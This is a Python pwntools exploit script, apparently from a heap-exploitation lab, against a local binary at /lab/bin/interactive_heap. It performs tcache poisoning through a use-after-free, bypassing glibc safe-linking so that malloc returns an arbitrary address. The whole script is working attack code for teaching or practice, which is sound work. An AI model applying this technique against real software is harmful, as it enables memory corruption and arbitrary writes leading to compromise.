#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/interactive_heap"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""

target = 0x404300


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr


def exploit(p):
    # get the first allocation
    p.sendline(b"malloc 0 100")
    # second allocation in same tcache bin
    p.sendline(b"malloc 1 100")

    # get the heap page where we're going to
    # write the fake fd pointer
    p.recvuntil(b"allocations[0] = malloc(100)")
    p.recvuntil(b"allocations[0] = ")
    heap_addr = int(p.recvline()[:-1], 16)
    heap_page = heap_addr & ~0xfff
    print(f"heap page: {heap_page:#x}")

    p.sendline(b"free 1")
    p.sendline(b"free 0")

    # at this point tcache bin 0x70: alloc0 -> alloc1
    # let's perform UAF from alloc 0 to overwrite fd and
    p.sendline(
        b"scanf 0 8 " + 
        pwn.p64(protect_ptr(heap_page, target))
    )
    # now tcache bin 0x70: alloc0 -> target

    # getting the first entry in tcache bin, we don't care
    p.sendline("malloc 3 100")
    # now tcache bin 0x70: target

    # getting the forged next chunk, making malloc return an arbitrary pointer
    p.sendline("malloc 3 100")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
